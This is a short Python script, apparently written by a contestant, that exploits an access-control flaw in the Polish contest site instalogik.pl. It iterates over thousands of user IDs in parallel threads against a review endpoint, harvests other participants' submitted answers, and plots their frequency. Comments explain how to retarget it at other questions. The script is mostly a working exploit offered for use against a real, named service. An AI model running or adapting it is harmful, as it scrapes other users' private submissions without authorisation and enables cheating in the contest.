'''
My shit code to show small exploit in instalogik.pl polish contest, that allows to see others answers.

version from 01.12.2021 17:48 UTC

By MarcinK50
'''
import requests
import matplotlib.pyplot as plt
import numpy as np
import threading
from colorama import Fore, Back, Style

data = []

def function(range1, range2, thread):
    for i in range(range1, range2):
        r = requests.get(f'https://instalogik.pl/handlers/get_tasks_review_from_stage.php?user_id={i}&stage_id=34')
        body = r.json()
        try:
            if body['data']['1']['tasks']['1']['solution'] != 'i_len=0':
                data.append(body['data']['1']['tasks']['1']['solution']) # need to change first numer after 'data' if you want to change question
        except:
            print(f'{Fore.YELLOW}[WARN]{Fore.WHITE}: failed to fetch {i}')

x = threading.Thread(target=function, args=(20000, 21000, 1)) # so many threads, but it's still proof of concept
x.start()
x3= threading.Thread(target=function, args=(21001, 22000, 2))
x3.start()
x2 = threading.Thread(target=function, args=(22001, 22500, 3))
x2.start()
y = threading.Thread(target=function, args=(22501, 23000, 4))
y.start()
y2 = threading.Thread(target=function, args=(23001, 23500, 5))
y2.start()
z = threading.Thread(target=function, args=(23501, 24500, 6))
z.start()
z2 = threading.Thread(target=function, args=(24501, 25000, 7))
z2.start()

x.join()
values, counts = np.unique(data, return_counts=True)

print(f'{Fore.GREEN}Finished!')

plt.bar(counts, counts, tick_label = values, # for assembly (open) questions insert counts instead of [0,1,2] 
        width = 1, color = ['green']) # for assembly questions you can use higher width

plt.xlabel('odpowiedź')
        # naming the y-axis
plt.ylabel('ilość odpowiedzi')
        # plot title
plt.title('Zadanie')
        
        # function to show the plot
plt.show()